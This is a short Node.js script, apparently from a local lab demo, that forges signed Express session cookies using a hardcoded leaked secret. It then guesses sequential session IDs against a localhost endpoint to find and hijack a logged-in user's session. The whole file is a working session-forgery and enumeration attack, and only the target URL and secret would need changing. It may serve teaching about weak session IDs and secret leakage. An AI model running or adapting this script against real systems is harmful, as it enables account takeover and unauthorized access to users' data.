const cookieSignature = require('cookie-signature');

const BASE_URL = 'http://localhost:3000';
const SECRET = 'super-secret-key'; // matches server.js — imagine this leaked via a public repo, .env commit, etc.
const GUESS_START = 1000;
const GUESS_END = 1050;

function forgeCookie(id) {
  const signed = cookieSignature.sign(id, SECRET);
  return `connect.sid=s%3A${encodeURIComponent(signed)}`;
}

async function tryId(id) {
  const cookie = forgeCookie(id);
  const res = await fetch(`${BASE_URL}/whoami`, {
    headers: { Cookie: cookie }
  });
  const data = await res.json();
  return data;
}

(async () => {
  console.log(`Guessing session IDs from sess_${GUESS_START} to sess_${GUESS_END}...`);
  for (let i = GUESS_START; i <= GUESS_END; i++) {
    const id = `sess_${i}`;
    const data = await tryId(id);
    if (data.session && data.session.user) {
      console.log(`✅ FOUND active session: ${id} -> user: ${data.session.user.username}`);
      return;
    }
  }
  console.log('No active session found in range (try widening it, or note the signature caveat in README).');
})();
